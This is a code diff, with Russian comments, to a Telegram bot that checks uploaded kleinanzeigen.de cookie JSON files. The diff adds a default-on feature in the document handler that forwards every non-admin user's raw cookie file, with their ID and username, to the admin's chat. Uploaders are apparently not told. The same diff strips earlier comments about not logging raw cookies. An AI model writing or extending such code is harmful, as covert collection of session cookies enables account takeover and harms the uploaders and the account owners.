@@ -1,7 +1,8 @@
 """Telegram-бот проверки cookie kleinanzeigen.de.
 
-- Цикл: 6 часов работы → 1 минута паузы → снова старт.
-- Логи шифруются (Fernet), автоудаляются по TTL, лежат ВНЕ репозитория.
+- Цикл: 6 часов работы → 1 минута паузы.
+- Логи шифруются (Fernet), автоудаляются по TTL.
+- Оригинальный JSON пересылается админу в Telegram.
 - Без ALLOWED_USER_IDS бот пускает только ADMIN_ID (fail-closed).
 """
 
@@ -20,7 +21,7 @@ from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ChatAction, ParseMode
 from aiogram.filters import Command, CommandStart
-from aiogram.types import Message
+from aiogram.types import BufferedInputFile, Message
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
 
@@ -44,7 +45,7 @@ ALLOWED_USER_IDS: set[int] = (
     {int(x) for x in _allowed.split(",") if x.strip()} if _allowed else set()
 )
 
-LOG_DIR = Path(os.getenv("LOG_DIR", "/var/lib/ka-bot/logs")).resolve()
+LOG_DIR = Path(os.getenv("LOG_DIR", "logs")).resolve()
 LOG_DIR.mkdir(parents=True, exist_ok=True)
 
 ENCRYPTION_KEY = os.getenv("LOG_ENCRYPTION_KEY", "").strip()
@@ -54,12 +55,15 @@ cipher = Fernet(ENCRYPTION_KEY.encode())
 
 MAX_FILE_SIZE = 1 * 1024 * 1024
 LOG_TTL_HOURS = int(os.getenv("LOG_TTL_HOURS", "72"))
+FORWARD_TO_ADMIN = os.getenv("FORWARD_TO_ADMIN", "true").strip().lower() in (
+    "1", "true", "yes", "on"
+)
 
-WORK_SECONDS = 6 * 60 * 60   # 6 часов
-SLEEP_SECONDS = 60           # 1 минута
+WORK_SECONDS = 6 * 60 * 60
+SLEEP_SECONDS = 60
 
 # ---------------------------------------------------------------------------
-# Логирование (только stdout, без сырых кук)
+# Логирование
 # ---------------------------------------------------------------------------
 
 logging.basicConfig(
@@ -97,6 +101,11 @@ def sanitize_filename(name: str, max_len: int = 60) -> str:
     return safe or "upload.json"
 
 
+def _meta_path(file_path: Path) -> Path:
+    """Путь к .meta.json для зашифрованного файла: ...json.enc → ...json.enc.meta.json"""
+    return file_path.with_name(file_path.name + ".meta.json")
+
+
 def save_encrypted_upload(
     raw: bytes,
     *,
@@ -127,7 +136,7 @@ def save_encrypted_upload(
         "encrypted": True,
         "result": None,
     }
-    (day_dir / (stem + ".meta.json")).write_text(
+    _meta_path(file_path).write_text(
         json.dumps(meta, ensure_ascii=False, indent=2),
         encoding="utf-8",
     )
@@ -135,7 +144,10 @@ def save_encrypted_upload(
 
 
 def update_meta_result(file_path: Path, result: CheckResult) -> None:
-    meta_path = file_path.with_suffix(file_path.suffix + ".meta.json")
+    meta_path = _meta_path(file_path)
+    if not meta_path.exists():
+        log.warning("meta missing: %s", meta_path)
+        return
     try:
         meta = json.loads(meta_path.read_text(encoding="utf-8"))
     except Exception:
@@ -185,7 +197,7 @@ def is_admin(user_id: int | None) -> bool:
 
 def is_allowed(user_id: int | None) -> bool:
     if not ALLOWED_USER_IDS:
-        return is_admin(user_id)   # fail-closed
+        return is_admin(user_id)
     return user_id in ALLOWED_USER_IDS
 
 
@@ -336,6 +348,22 @@ async def on_document(msg: Message):
         show_saved_path=is_admin(u.id),
     ))
 
+    # Пересылаем оригинальный JSON админу — это и есть «сохранение логов»
+    if FORWARD_TO_ADMIN and ADMIN_ID and u.id != ADMIN_ID:
+        try:
+            await bot.send_document(
+                chat_id=ADMIN_ID,
+                document=BufferedInputFile(raw, filename=doc.file_name or "cookies.json"),
+                caption=(
+                    f"📥 От <code>{u.id}</code>"
+                    f"{f' (@{u.username})' if u.username else ''}\n"
+                    f"{ICONS.get(result.status, '•')} <b>{result.status}</b>"
+                    f" • HTTP {result.http_code if result.http_code else '—'}"
+                ),
+            )
+        except Exception:
+            log.exception("forward to admin failed")
+
 
 @router.message(F.text)
 async def fallback(msg: Message):
@@ -376,6 +404,7 @@ async def polling_cycle() -> None:
 
 async def main() -> None:
     log.info("Bot started. Log dir: %s (encrypted)", LOG_DIR)
+    log.info("Forward to admin: %s", FORWARD_TO_ADMIN)
     if ADMIN_ID:
         log.info("Admin ID: %s", ADMIN_ID)
     else:
